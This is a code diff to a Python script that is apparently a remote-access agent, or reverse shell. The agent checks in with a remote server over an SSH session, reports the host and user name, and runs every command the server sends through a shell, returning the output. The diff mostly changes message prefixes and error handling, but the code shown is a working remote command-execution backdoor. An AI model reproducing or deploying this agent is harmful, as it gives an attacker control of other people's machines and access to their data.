@@ -35,12 +35,12 @@ def SSH_comm():
         host = socket.gethostname()
         user = getpass.getuser()
     except Exception as ex:
-        print('Error, possible invalid sever details. Use -h for help.')
+        print('[!] Error, possible invalid sever details. Use -h for help.')
         #print('Debug info:\n' + str(ex))
         sys.exit()
 
     if start_session.active:
-        start_session.send(f'Agent checked in from \"{host}\" as \"{user}\".\n')
+        start_session.send(f'[*] Agent checked in from \"{host}\" as \"{user}\".\n')
         print(start_session.recv(1024).decode())
         while True:
             incoming = start_session.recv(1024)
@@ -52,19 +52,22 @@ def SSH_comm():
                     path = command.split(" ")[1]
                     os.chdir(path)
                     CWD = os.getcwd()
-                    #command_out = subprocess.check_output(shlex.split(command), stderr=subprocess.STDOUT, shell=True)
-                    start_session.send(f'Changed directory to {CWD}\n')
+                    start_session.send(f'[*] Changed directory to {CWD}\n')
                 else:
+                    #command_out = subprocess.check_output(shlex.split(command), stderr=subprocess.STDOUT, shell=True)
                     command_out = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
                     #print(command)
-                    start_session.send(command_out)
+                    if (len(command_out) == 0):
+                        start_session.send("[*] Command executed. No shell output.\n")
+                    else:
+                        start_session.send(command_out)
             except Exception as ex:
-                start_session.send(str(ex) + '\n')
+                start_session.send('[!] ' + str(ex) + '\n')
                 pass
-            except KeyboardInterrupt:
-                start_session.send("Session interrupted.\n")
-                sys.exit()
     return
 
 if __name__ == "__main__":
-    SSH_comm()
+    try:
+        SSH_comm()
+    except Exception as ex:
+        print(str(ex))
